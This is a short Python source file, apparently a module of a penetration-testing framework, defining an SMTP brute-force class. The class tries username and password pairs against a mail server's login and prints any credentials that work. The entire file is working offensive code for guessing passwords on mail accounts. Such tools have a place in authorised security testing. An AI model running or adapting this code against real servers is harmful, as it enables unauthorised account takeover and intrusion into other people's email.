import smtplib

from bruteforce_login import ThreadedBruteForceLogin


class SMTPBruteForce(ThreadedBruteForceLogin):

    def __init__(self):
        super().__init__("smtp_bruteforce",
                         ["smtp", "email", "bruteforce"],
                         "brute force smtp logins",
                         port=25)

    def login(self, username: str, password: str):
        try:
            with smtplib.SMTP(self.rhost, self.rport, self.timeout) as server:
                server.login(username, password)

                print(f"[+] password found: {username}:{password}")
                return True
        except smtplib.SMTPAuthenticationError:
            pass

        if self.verbose:
            print(f"[-] incorrect credentials: {username}:{password}")

        return False
